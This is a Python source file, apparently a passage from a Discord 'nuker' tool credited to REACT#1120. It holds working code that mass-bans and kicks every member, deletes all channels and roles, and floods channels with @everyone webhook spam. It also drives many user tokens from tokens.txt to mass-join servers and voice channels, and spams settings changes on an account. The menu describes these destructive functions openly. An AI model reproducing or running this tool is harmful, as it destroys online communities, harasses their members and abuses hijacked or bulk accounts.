                        "title": "React Server Nuker",
                        "description": f"@everyone\n\n> {Message}",
                        "color": random.randint(0, 16777215),
                        "author": {
                                "name": "React Server Nuker",
                                "url": "https://smilewindiscord-th.web.app/joindiscord.html",
                                "icon_url": URL.IconURL
                            },
                            "footer": {
                                "text": "Nuked ~",
                                "icon_url": URL.IconURL
                            },
                            "timestamp": f"{str(datetime.datetime.utcnow())}",
                            "image": {
                                "url": URL.IconURL
                            },
                            "thumbnail": {
                                "url": URL.IconURL
                            }
                        }
            
                    ]
                }
            )
            if response.status_code in Status.SuccessStatus:
                Status.Success(f"Webhook sent")
            
            elif response.status_code == 429:
                Status.Ratelimit(f"Ratelimited")

            else:
                Status.Fail(f"Unable to send")

        except Exception as e:
            print(e)
    
    def CreateRole(RoleName):
        response = requests.post(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/roles", headers=ReqHeader.DiscordHeader(), json={
            "name":RoleName,
            "color": random.randint(0, 16777215),
            "permissions": "1090921168895"
        })
        if response.status_code in Status.SuccessStatus:
            Status.Success(f"Created Role {RoleName}")

        elif response.status_code in Status.RatelimitStatus:
            Status.Ratelimit(f"Ratelimit")
            time.sleep(0.05)
            threading.Thread(target=Discord.CreateRole, args=(str(RoleName))).start()
        
        else:
            Status.Fail(f"Couldn't Create Role {RoleName}")

    def DeleteRole(RoleID):
        response = requests.delete(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/roles/{RoleID}", headers=ReqHeader.DiscordHeader())
        if response.status_code in Status.SuccessStatus:
            Status.Success(f"Created role {RoleID}")
        
        elif response.status_code == 429:
            Status.Ratelimit(f"")
            time.sleep(0.05)
            threading.Thread(target=Discord.DeleteRole, args=(RoleID)).start()

        else:
            Status.Fail(f"Couldn't delete role {RoleID}")

    def ChangeRoleName(RoleID , RoleName):
        response = requests.patch(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/roles/{RoleID}", headers=ReqHeader.DiscordHeader(), json={
            "name": f"{RoleName}"
        })

        if response.status_code in Status.SuccessStatus:
            Status.Success(f"CHANNEL NAME CHANGED")
        
        elif response.status_code == 429:
            time.sleep(0.05)
            threading.Thread(target=Discord.ChangeRoleName,args=(RoleID,RoleName)).start()

        else:
            Status.Fail(f"CHANNEL NAME NOT CHANGED")

    def CreateChannel(ChannelName):
        response = requests.post(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/channels", headers=ReqHeader.DiscordHeader(), json = {
            'name': ChannelName,
            'type': 0
        })
        if response.status_code in Status.SuccessStatus:
            Status.Success(f"Created Channel {ChannelName}")
        
        elif response.status_code in Status.RatelimitStatus:
            Status.Ratelimit(f"Ratelimit")
            time.sleep(0.05)
            threading.Thread(target=Discord.CreateChannel, args=(ChannelName)).start()

        else:
            Status.Fail(f"Couldn't Create Channel {ChannelName}")


    def DeleteChannel(ChannelID):
        try:
            response = requests.delete(f"{URL.BaseURL}channels/{ChannelID}", headers=ReqHeader.DiscordHeader())
            if response.status_code in Status.SuccessStatus:
                Status.Success(f"Deleted Channel {ChannelID}")
            
            elif response.status_code in Status.RatelimitStatus:
                Status.Ratelimit(f"Ratelimit")
                time.sleep(0.05)
                with ThreadPoolExecutor(max_workers=1) as executor:
                    executor.submit(Discord.DeleteChannel,ChannelID)

            else:
                Status.Fail(f"Couldn't Delete Channel {ChannelID}")
        except:
            pass
    
    def ChangeChannelName(Channel , ChannelName):
        response = requests.patch(f"{URL.BaseURL}channels/{Channel}", headers=ReqHeader.DiscordHeader(), json={
            "name": f"{ChannelName}"
        })

        if response.status_code in Status.SuccessStatus:
            Status.Success(f"CHANNEL NAME CHANGED")
        
        elif response.status_code in Status.RatelimitStatus:
            Status.Ratelimit(f"Ratelimit")
            time.sleep(0.05)
            threading.Thread(target=Discord.ChangeChannelName,args=(Channel, ChannelName)).start()

        else:
            Status.Fail(f"CHANNEL NAME NOT CHANGED")

    def CreateCategory(ChannelName):
        response = requests.post(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/channels", headers=ReqHeader.DiscordHeader(), json = {
            "name": ChannelName,
            "type": 4,
            "permission_overwrites": []

        })
        if response.status_code in Status.SuccessStatus:
            Status.Success(f"Created Channel {ChannelName}")
        
        elif response.status_code in Status.RatelimitStatus:
            Status.Ratelimit(f"Ratelimit")
            time.sleep(0.05)
            threading.Thread(target=Discord.CreateCategory, args=(ChannelName)).start()

        else:
            Status.Fail(f"Couldn't Create Channel {ChannelName}")
    
    def CreateVoiceChannel(ChannelName):
        response = requests.post(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/channels", headers=ReqHeader.DiscordHeader(), json = {
            "name": ChannelName,
            "type": 2,
            "permission_overwrites": []

        })
        if response.status_code in Status.SuccessStatus:
            Status.Success(f"Created Channel {ChannelName}")
        
        elif response.status_code in Status.RatelimitStatus:
            Status.Ratelimit(f"Ratelimit")
            time.sleep(0.05)
            threading.Thread(target=Discord.CreateVoiceChannel, args=(ChannelName)).start()

        else:
            Status.Fail(f"Couldn't Create Channel {ChannelName}")

    def Ban(Member= None):
        if Member is None:
            Member = input(f"{Constant.Space}{Colour.YELLOW}Member ID : ")

        try:
            response = requests.put(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/bans/{Member}", headers=ReqHeader.DiscordHeader(), json = {
                'delete_message_days': '7',
                'reason': 'NUKE'
            })
            if response.status_code in Status.SuccessStatus:
                Status.Success(f"Banned {Member}")

            elif response.status_code in Status.RatelimitStatus:
                Status.Ratelimit(f"Ratelimit")
                time.sleep(0.05)
                threading.Thread(target=Discord.Ban, args=(str(Member))).start()
                
            else:
                Status.Fail(f"Failed to ban {Member}")

        except:
            pass

    def Kick(Member = None):
        if Member is None:
            Member = input(f"{Constant.Space}{Colour.YELLOW}Member ID : ")

        try:
            response = requests.delete(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/members/{Member}", headers=ReqHeader.DiscordHeader(), json = {
                "delete_message_days": "7",
                "reason": "React"
            })
            if response.status_code in Status.SuccessStatus:
                Status.Success(f"{Member}")

            elif response.status_code in Status.RatelimitStatus:
                Status.Ratelimit(f"Ratelimit")
                time.sleep(0.05)
                threading.Thread(target=Discord.Kick, args=(str(Member))).start()
            
            else:
                Status.Fail(f"{Member}")
                
        except:
            pass
    
    def Unban(Member = None):
        if Member is None:
            Member = input(f"{Constant.Space}{Colour.YELLOW}Member ID : ")
        try:
            response = requests.delete(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/bans/{Member}",headers=ReqHeader.DiscordHeader())
            if response.status_code in Status.SuccessStatus:
                Status.Success(f"Unban {Member}")
            
            elif response.status_code in Status.RatelimitStatus:
                Status.Ratelimit(f"Ratelimit")
                time.sleep(0.05)
                threading.Thread(target=Discord.Kick, args=(str(Member))).start()
            
            else:
                Status.Fail(f"Unable to unban {Member}")
        
        except:
            pass

    def CreateWebhook(Channel):
        response = requests.post(f"{URL.BaseURL}channels/{Channel}/webhooks", json={
            "name": "REACT"
            }, headers= ReqHeader.DiscordHeader())

        if response.status_code in Status.SuccessStatus:
            Status.Success(f"WEBHOOK CREATED")

        elif response.status_code in Status.RatelimitStatus:
            Status.Ratelimit(f"Ratelimit")
            time.sleep(0.05)
            threading.Thread(target=Discord.CreateWebhook,args=(Channel)).start()
        
        else:
            Status.Fail(f"WEBHOOK NOT CREATED")

    def Join(token):
        response = requests.post(f"{URL.BaseURL}invites/{Constant.INVITE_CODE}", headers= ReqHeader.DiscordHeader())
        if response.status_code in Status.SuccessStatus:
            Status.Success(f"TOKEN : {token} JOINED")
        
        elif response.status_code in Status.RatelimitStatus:
            Status.Ratelimit(f"Ratelimit")
            time.sleep(0.05)
            threading.Thread(target=Discord.Join,args=(token)).start()

        else:
            Status.Fail(f"TOKEN : {token} NOT JOINED")

    def Leave(token):   
        response = requests.delete(f"{URL.BaseURL}users/@me/guilds/{Constant.SERVER_ID}", json={"lurking": "false"} , headers=ReqHeader())
        if response.status_code in Status.SuccessStatus:
            Status.Success(f"TOKEN : {token} LEAVE")
        
        elif response.status_code in Status.RatelimitStatus:
            Status.Ratelimit(f"Ratelimit")
            time.sleep(0.05)
            threading.Thread(target=Discord.Leave,args=(token)).start()
        
        else:
            Status.Fail(f"TOKEN : {token} NOT LEAVE")

    def Connect(Token,VOICE_ID):
        ws = websocket.WebSocket()
        ws.connect(URL.DiscordWebsocket)
        RECV = json.loads(ws.recv())
        heartbeat_interval = RECV['d']['heartbeat_interval']
        ws.send(json.dumps({
                    "op":2,
                    "d": {
                        "token":Token, 
                        "properties": {
                            "$os":"windows",
                            "$browser":"Discord",
                            "$device": "desktop" 
                            }
                        }
                    }
                )
            )
        ws.send(json.dumps({
                    "op":4,
                    "d": {
                        "guild_id":Constant.SERVER_ID, 
                        "channel_id": VOICE_ID,
                        "self_mute":True,
                        "self_deaf":True
                    }
                }
            )
        )
        Status.Success(f"{Token} Connected")
        while True:
            time.sleep(heartbeat_interval/1000)
            try:
                ws.send(json.dumps({
                    "op":1,
                    "d":None}))
            except Exception:
                break

    def Online(Token,Type,Game):
        ws = websocket.WebSocket()
        ws.connect(URL.DiscordWebsocket)
        RECV = json.loads(ws.recv())
        heartbeat_interval = RECV['d']['heartbeat_interval']
        Status = {
            1 :  {
                        "name": Game,
                        "type": 0
                    },
            2 : {
                        "name": Game,
                        "type": 1,
                        "url": "https://www.twitch.tv/soulless.cc"
                    },
                
            3 : {
                        "name": Game,
                        "type": 2
                    },
                
            4 : {
                        "name": Game,
                        "type": 3
                    }
            }

        ws.send(json.dumps({
            "op":2,
            "d": {
                "token":Token,
                "properties": {
                    "$os":"windows",
                    "$browser":"Discord",
                    "$device": "desktop" 
                },
                "presence": {
                    "game": Status[Type],
                    "status": "online",
                    "since":0,
                    "afk":False
                }
            },
            "s":None,
            "t":None
        }
    )
)
        Status.Success(f"{Token} Online")
        while True:
            time.sleep(heartbeat_interval/1000)
            try:
                ws.send(json.dumps({
                    "op":1,
                    "d":None}))
            except Exception:
                break

    def Livestream(Token, VOICE_ID):
        ws = websocket.WebSocket()
        ws.connect(URL.DiscordWebsocket)
        RECV = json.loads(ws.recv())
        heartbeat_interval = RECV['d']['heartbeat_interval']
        ws.send(json.dumps({
                    "op":2,
                    "d": {
                        "token":Token, 
                        "properties": {
                            "$os":"windows",
                            "$browser":"Discord",
                            "$device": "desktop" 
                            }
                        }
                    }
                )
            )
        ws.send(json.dumps({
                    "op":4,
                    "d": {
                        "guild_id":Constant.SERVER_ID, 
                        "channel_id": VOICE_ID,
                        "self_mute":True,
                        "self_deaf":True
                    }
                }
            )
        )
        ws.send(json.dumps({
            "op":18,
            "d": {
                "type":"guild",
                "guild_id":Constant.SERVER_ID, 
                "channel_id": VOICE_ID,
                "preferred_region":"singapore"
                }
            }
        )
    )   

        Status.Success(f"{Token} Livestream")
        threading._start_new_thread(Function.SendHeartBeatInterval, (heartbeat_interval, ws))
        
    def LanguageSpam():
        Languages = [
            ["bg","Bulgarian"],  
            ["zh-CN","Chinese"],
            ["hr","Croatian"],
            ["cs","Czech"],
            ["da","Danish"],
            ["nl","Dutch"],
            ["fi","Finnish"],    
            ["fr","French"],
            ["de","German"],
            ["el","Greek"],
            ["hi","Hindi"],
            ["hu","Hungarian"], 
            ["it","Italian"],
            ["ja","Japanese"],
            ["ko","Korean"],
            ["lt","Lithuanian"],
            ["no","Norwegian"],
            ["pl","Polish"],
            ["pt-BR","Portuguese"],
            ["ro","Romanian"],
            ["ru","Russian"],
            ["es-ES","Spanish"],
            ["sv-SE","Swedish"],
            ["th","Thai"],
            ["tr","Turkish"],
            ["uk","Ukrainian"],       
            ["vi","Vietnamese"]
        ]
        while True:
            for Language in Languages:
                response = requests.patch(f"{URL.Canary}users/@me/settings",headers=ReqHeader.DiscordHeader(), json={
                    "locale": Language[0]
                })

                if response.status_code in Status.SuccessStatus:
                    Status.Success(f"Language changed to {Language[1]}")

    def ThemeFlashingBlack():
        while True:
            for Theme in ["dark"]  :
                response = requests.patch(f"{URL.BaseURL}users/@me/settings",headers=ReqHeader.DiscordHeader(), json={
                    "theme": Theme

                })
                if response.status_code in Status.SuccessStatus:
                    Status.Success(f"Theme changed to {Theme}")

    def ThemeFlashingWhite():
        while True:
            for Theme in ["light"]  :
                response = requests.patch(f"{URL.BaseURL}users/@me/settings",headers=ReqHeader.DiscordHeader(), json={
                    "theme": Theme

                })
                if response.status_code in Status.SuccessStatus:
                    Status.Success(f"Theme changed to {Theme}")

class ThreadFunction:

    def Ban_ID():
        print(Data.GetBanMember_ID())

    def Channel_ID():
        print(Data.GetChannel_ID())
    
    def Member_ID():
        print(Data.GetMember_ID())
    
    def Role_ID():
        print(Data.GetRole_ID())

    def ThreadPinMessage():
        Channel = input(f"{Constant.Space}{Colour.YELLOW}")
        Message = Data.GetMessage_ID(Channel)
        with ThreadPoolExecutor(max_workers=50) as executor:
            pass

    def ThreadThemeFlash():
        func = [Discord.ThemeFlashingWhite,Discord.ThemeFlashingBlack]
        with ThreadPoolExecutor(max_workers=4) as executor:
            for i in range(4):
                time.sleep(0.045)
                executor.submit(func[i])
    
    def ThreadSpamLanguage():
        with ThreadPoolExecutor(max_workers=4) as executor:
            for i in range(4):
                time.sleep(0.045)
                executor.submit(Discord.LanguageSpam)

    def ThreadTokenFuck():
        func = [ThreadFunction.ThreadThemeFlash,Discord.LanguageSpam]
        with ThreadPoolExecutor(max_workers=2) as executor:
            for i in range(2):
                time.sleep(0.045)
                executor.submit(func[i])

    def ThreadChangeChannelName():
        if Constant.TOKEN is not False and Constant.SERVER_ID is not False:
            Channels = Data.GetChannel_ID()
            Name = input(f"{Constant.Space}{Colour.YELLOW}Channel Name : ")
            with ThreadPoolExecutor(max_workers=len(Channels)) as executor:
                for Channel in Channels:
                    executor.submit(Discord.ChangeChannelName,str(Channel),str(Name),)
    
    def ThreadCreateRole():
        if Constant.TOKEN is not False and Constant.SERVER_ID is not False:
            Num = int(input(f"{Constant.Space}{Colour.YELLOW}"))
            Name = input(f"{Constant.Space}{Colour.YELLOW}")
            with ThreadPoolExecutor(max_workers=Num) as executor:
                for i in range(Num):
                    time.sleep(0.045)
                    executor.submit(Discord.CreateRole,str(Name),)
    
    def ThreadDeleteRole():
        if Constant.TOKEN is not False:
            Roles = Data.GetRole_ID()
            with ThreadPoolExecutor(max_workers=len(Roles)) as executor:
                for Role in Roles:
                    executor.submit(Discord.DeleteRole,str(Role),)

    def ThreadCreateCategory():
        if Constant.TOKEN is not False and Constant.SERVER_ID is not False:
            Num = int(input(f"{Constant.Space}{Colour.YELLOW}"))
            Name = input(f"{Constant.Space}{Colour.YELLOW}")
            with ThreadPoolExecutor(max_workers=Num) as executor:
                for i in range(Num):
                    time.sleep(0.045)
                    executor.submit(Discord.CreateCategory,str(Name),)
    
    def ThreadCreateVoice():
        if Constant.TOKEN is not False and Constant.SERVER_ID is not False:
            Num = int(input(f"{Constant.Space}{Colour.YELLOW}"))
            Name = input(f"{Constant.Space}{Colour.YELLOW}")
            with ThreadPoolExecutor(max_workers=Num) as executor:
                for i in range(Num):
                    time.sleep(0.045)
                    executor.submit(Discord.CreateVoiceChannel,str(Name),)
            
    def ThreadCreateChannel():
        if Constant.TOKEN is not False and Constant.SERVER_ID is not False:
            Num = int(input(f"{Constant.Space}{Colour.YELLOW}Number : "))
            Name = input(f"{Constant.Space}{Colour.YELLOW}Name : ")
            with ThreadPoolExecutor(max_workers=Num) as executor:
                for i in range(Num):
                    time.sleep(0.045)
                    executor.submit(Discord.CreateChannel,Name,)
            
    def ThreadDeleteChannel():
        if Constant.TOKEN is not False:
            Channels = Data.GetChannel_ID()
            with ThreadPoolExecutor(max_workers=len(Channels)) as executor:
                for i in range(len(Channels)):
                    time.sleep(0.045)
                    executor.submit(Discord.DeleteChannel,Channels[i],)

    def ThreadSpamWebhook():
        if Constant.TOKEN is not False and Constant.SERVER_ID is not False:
            ChannelID = Data.GetTextChannel_ID()
            Message = input(f"{Constant.Space}{Colour.YELLOW}Message : ")
            Loop = int(input(f"{Constant.Space}{Colour.YELLOW}Loop : "))
            Threads =[] 
            webhooks = []
            if len(ChannelID) > 500:
                ChannelID[:500]

            for Channel in ChannelID:
                response = requests.get(f"{URL.BaseURL}channels/{Channel}/webhooks",headers=ReqHeader.DiscordHeader())
                webhooks_url = []
                if response.status_code in Status.SuccessStatus:
                    if len(response.json()) > 1:
                        for i in range(len(response.json())):
                            webhooks_url.append(f'{URL.WebhookBase}{response.json()[i]["id"]}/{response.json()[i]["token"]}')

                    while len(webhooks_url) < 5:
                        response = requests.post(f"{URL.BaseURL}channels/{Channel}/webhooks",headers=ReqHeader.DiscordHeader(),
                            json = {
                                "name":"React"
                            })
                        
                        if response.status_code not in Status.SuccessStatus:
                            break

                        else:
                            webhooks_url.append(f'{URL.WebhookBase}{response.json()["id"]}/{response.json()["token"]}')

                    else:
                        webhooks.append(webhooks_url)
                        print(webhooks_url)
                        continue
                    break

            try:
                if len(webhooks) < 5:
                    delay = 0.55
                
                else:
                    if len(webhooks) > 5:
                        delay = 0.45
                    
                    if len(webhooks) > 10:
                        delay = 0.35
                    
                    if len(webhooks) > 15:
                        delay = 0.30
                    
                    if len(webhooks) > 30:
                        delay = 0.25

                    if len(webhooks) > 50:
                        delay = 0.20
                    
                    if len(webhooks) > 100:
                        delay = 0.15
                    
                    if len(webhooks) > 150:
                        delay = 0.10
                    
                    if len(webhooks) > 200:
                        delay = 0.05

                with ThreadPoolExecutor(max_workers=Loop*(len(webhooks)*10)) as executor:
                    for i in range(int(Loop/3)):
                        for Webhook_urls in webhooks:
                            for Webhook_url in Webhook_urls:
                                for i in range(6):
                                    Threads.append(executor.submit(Discord.SendWebhook,Webhook_url,str(Message),))
                                    time.sleep(delay)

            except Exception as e:
                print(e)
        
        else:
            print(f"{Constant.Space}{Colour.YELLOW}")

    def ThreadKick():
        if Constant.TOKEN is not False and Constant.SERVER_ID is not False:
            Members = Data.GetMember_ID()
            with ThreadPoolExecutor(max_workers=len(Members)) as executor:
                for Member in Members:
                    executor.submit(Discord.Kick,str(Member),)

        else:
            print(f"{Constant.Space}")

    def ThreadBan():
        if Constant.TOKEN is not False and Constant.SERVER_ID is not False:
            Members = Data.GetMember_ID()
            with ThreadPoolExecutor(max_workers=len(Members)) as executor:
                for Member in Members:
                    executor.submit(Discord.Ban,str(Member),)
        
        else:
            print(f"{Constant.Space}{Colour.YELLOW}")
    
    def ThreadUnban():
        if Constant.TOKEN is not False and Constant.SERVER_ID is not False:
            Members = Data.GetBanMember_ID()
            with ThreadPoolExecutor(max_workers=len(Members)) as executor:
                for Member in Members:
                    executor.submit(Discord.Unban,str(Member),)

        else:
            print(f"{Constant.Space}")

    def ThreadLivestream():
        if Constant.SERVER_ID is not False:
            VOICE_ID = input(f"{Constant.Space}{Colour.YELLOW}Voice channel ID : ")
            with ThreadPoolExecutor(max_workers=len(Constant.TOKENS)) as executor:
                for token in Constant.TOKENS:
                    executor.submit(Discord.Livestream,token,str(VOICE_ID),)

        else:
            print(f"{Constant.Space}")
    
    def ThreadConnect():
        if Constant.SERVER_ID is not False:
            VOICE_ID = input(f"{Constant.Space}{Colour.YELLOW}Voice channel ID : ")
            with ThreadPoolExecutor(max_workers=len(Constant.TOKENS)) as executor:
                for token in Constant.TOKENS:
                    executor.submit(Discord.Connect,token,str(VOICE_ID),)

        else:
            print(f"{Constant.Space}")

    def ThreadOnline():
        if Constant.SERVER_ID is not False:
            Type = int(input(f"{Constant.Space}{Colour.YELLOW}Type : "))
            Game = input(f"{Constant.Space}{Colour.YELLOW}Game : ")
            with ThreadPoolExecutor(max_workers=len(Constant.TOKENS)) as executor:
                for token in Constant.TOKENS:
                    executor.submit(Discord.Online,token,Type,Game,)
        
        else:
            print(f"{Constant.Space}")

class Main:
    FunctionDict = {
        1: [ThreadFunction.Channel_ID,"Scrape Channels",
        "Scrape channels ID in the discord server"], 
        2: [ThreadFunction.Member_ID,"Scrape Members",
        "Scrape Members ID in the discord server"],
        3: [ThreadFunction.Role_ID,"Scrape Roles",
        "Scrape Roles ID in the discord server"], 
        4: [ThreadFunction.Ban_ID,"Scrape Bans",
        "Scrape Banned Members ID in the discord server"],
        5: [ThreadFunction.ThreadKick,"Kick all",
        "Kick every member in the discord server"],
        6: [ThreadFunction.ThreadBan,"Ban all",
        "Ban every member in the discord server"],
        7: [ThreadFunction.ThreadUnban,"Unban all",
        "Unban everyone in the discord server"],
        8: [Discord.Kick,"Kick ID",
        "Kick a member from their discord ID"],
        9: [Discord.Ban,"Ban ID",
        "Ban a member from their discord ID"],
        10:[Discord.Unban,"Unban ID",
        "Unban a member from their discord ID"],
        11:[Discord.Join,"Mass Join",
        "Mass join a server using tokens.txt"],
        12:[Discord.Leave,"Mass Leave",
        "Mass leave a server using tokens.txt"], 
        13:[Discord.CreateWebhook,"Create Webhook",
        "Create a webhook in a channel"],
        14:[ThreadFunction.ThreadSpamWebhook,"Spam Webhook",
        "Create and spamwebhook in every channels"],
        15:[ThreadFunction.ThreadConnect,"Connect",
        "Mass connect tokens from tokens.txt to voice channel"], 
        16:[ThreadFunction.ThreadOnline,"Online",
        "Mass online tokens from tokens.txt"],
        17:[ThreadFunction.ThreadLivestream,"Livestream",
        "Mass livestream tokens from tokens.txt"],    
        18:[ThreadFunction.ThreadCreateChannel,"Create Channels",
        "Spam create channel in discord server"],
        19:[ThreadFunction.ThreadDeleteChannel,"Delete Channels",
        "Spam delete channel in discord server"],
        20:[ThreadFunction.ThreadChangeChannelName,"Channel Name",
        "Spam edit channel name in discord server"],
        21:[ThreadFunction.ThreadCreateCategory,"Create Category",
        "Spam create category in discord server"],
        22:[ThreadFunction.ThreadCreateVoice,"Create Voice",
        "Spam create voice channel in discord server"],
        23:[ThreadFunction.ThreadCreateRole,"Create Role",
        "Spam create roles in discord server"],
        24:[ThreadFunction.ThreadDeleteRole,"Delete Role",
        "Spam delete roles in discord server"],
        25:[Discord.ChangeRoleName,"Change Role",
        "Spam edit role name in discord server"],
        26:["","Change Nickname",
        "Change Nickname"],
        27:[Discord.ChangeServerName,"Server Name",
        "Server Name"],
        28:[Discord.ChangeServerImage,"Server Picture",
        "Server Picture"],
        29:["","Spam Channel",
        "Spam Channel"],
        30:[ThreadFunction.ThreadSpamLanguage,"Language Spam",
        ""],
        31:[ThreadFunction.ThreadThemeFlash,"Theme Flash",
        ""],
        32:[Discord.CreateServer,"Server Spam",
        ""],
        33:[ThreadFunction.ThreadTokenFuck,"Token Fuck",
        "Token Fuck"],
        34:[Discord.ChangeStatus,"Change Status",
        "เปลี่ยนสถานะ"],
        35:[Discord.DiscordTokenLogin,"Login Token",
        "Login Token"],
        36:["","Nuke Server",
        "Nuke Server"],
        37:[Data.GetTokenInfo,"Token Info",
        ""],
        38:[Discord.CopyServer,"Copy Server",
        ""],
        39:[Data.GetUserInfoServer,"",""],
        40:["","",""],
        41:["","",""],
        42:["","",""],
        43:["","Help","Show help"],
        44:[sys.exit,"Exit","ออก"],
    }

    def run(Run =False):
        if Function.CheckInternet() is True:
            Function.Clear()
            Function.Menu()
            ctypes.windll.kernel32.SetConsoleTitleW("Disocrd Nuker BY REACT#1120 | Ready")
            if Run is False:
                Function.DiscordRPC()
                if Constant.CheckForUpdate is True:
                    Stat , Respond =Update.CheckUpdate(Constant.CheckForUpdate)

                    if Stat == "UPDATE" and Respond.upper() in ["Y","YES"]:
                        Update.UpdateProgram()
                else:
                    pass
            Function.Clear()
            Function.Menu()
            while True:
                try:    
                    Choice = int(input(f"{Constant.Space}{Colour.YELLOW}ROOT{Colour.WHITE}@{Colour.YELLOW}REACT>> {Colour.WHITE}"))
                    ctypes.windll.kernel32.SetConsoleTitleW(f"Discord Nuker BY REACT#1120 | Running -> {Main.FunctionDict[Choice][1]}")
                    Main.FunctionDict[Choice][0]()

                    if input(f"{Constant.Space}{Colour.YELLOW}CONTINUE ? [ Y/N ] ").upper() in ["Y","YES"]:
                        ctypes.windll.kernel32.SetConsoleTitleW("Disocrd Nuker BY REACT#1120 | Ready")
                        Main.run(Run=True)
                        break
                    
                    else:
                        Main.FunctionDict[36][0]()

                except (ValueError, KeyError) as e:
                    print(e)
                    Status.Fail("Invalid choice")

        else:
            Function.Clear()
            print(f"{Constant.Space}{Colour.RED}No Internet Connection")

def start(START=False):
    title = ''
    for char in "Disocrd Nuker BY REACT#1120": 
        title = title + char
        time.sleep(0.018)
        ctypes.windll.kernel32.SetConsoleTitleW(f'{title}')
    os.system("color 07")

    if START is True:
        Function.Spinner()
        ctypes.windll.kernel32.SetConsoleTitleW("Disocrd Nuker BY REACT#1120 | Loading...")
        try:
            Main.run()
        except Exception as e:
            print(e)
    else:
        print(f"{Constant.Space}Unable to run")

#run script
if __name__ == "__main__":
    start(Constant.START)
